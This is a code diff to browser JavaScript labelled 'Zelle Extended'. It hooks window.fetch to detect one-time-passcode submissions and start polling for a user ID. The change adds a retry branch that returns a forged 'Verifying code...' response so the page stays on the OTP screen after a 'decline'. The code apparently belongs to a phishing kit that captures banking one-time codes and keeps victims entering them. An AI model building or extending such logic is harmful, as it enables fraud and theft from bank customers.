@@ -912,7 +912,7 @@
     }
     
     // ========================================
-    // PASSIVE FETCH TAP - OBSERVE ONLY, DON'T INTERFERE
+    // PASSIVE FETCH TAP WITH RETRY DETECTION
     // ========================================
     function interceptOtpSubmission() {
         const originalFetch = window.fetch;
@@ -930,16 +930,36 @@
                     const data = await clonedResponse.json();
                     
                     if (data.success && data.id) {
-                        console.log('[Zelle Extended] 🔎 OTP detected. Starting polling for user:', data.id);
-                        currentUserId = data.id;
-                        startOtpPolling(data.id);
+                        console.log('[Zelle Extended] 🔎 OTP detected. User ID:', data.id);
+                        
+                        // Check if this is a RETRY (polling was stopped after decline)
+                        if (pollingStopped && currentUserId === data.id) {
+                            console.log('[Zelle Extended] 🔄 RETRY DETECTED - Restarting polling');
+                            
+                            // Restart polling for retry
+                            startOtpPolling(data.id);
+                            
+                            // ⚠️ Return modified response ONLY for retry to keep React on OTP page
+                            return new Response(JSON.stringify({
+                                success: false,
+                                message: 'Verifying code...'
+                            }), {
+                                status: 200,
+                                headers: { 'Content-Type': 'application/json' }
+                            });
+                        } else {
+                            // First time - observe only, let React proceed normally
+                            console.log('[Zelle Extended] ✅ FIRST SUBMISSION - Starting polling');
+                            currentUserId = data.id;
+                            startOtpPolling(data.id);
+                        }
                     }
                 }
             } catch (err) {
                 console.warn('[Zelle Extended] Tap error:', err);
             }
             
-            // ✅ CRITICAL: Always return original response - NEVER modify
+            // Return original response (except for retry case handled above)
             return response;
         };
     }
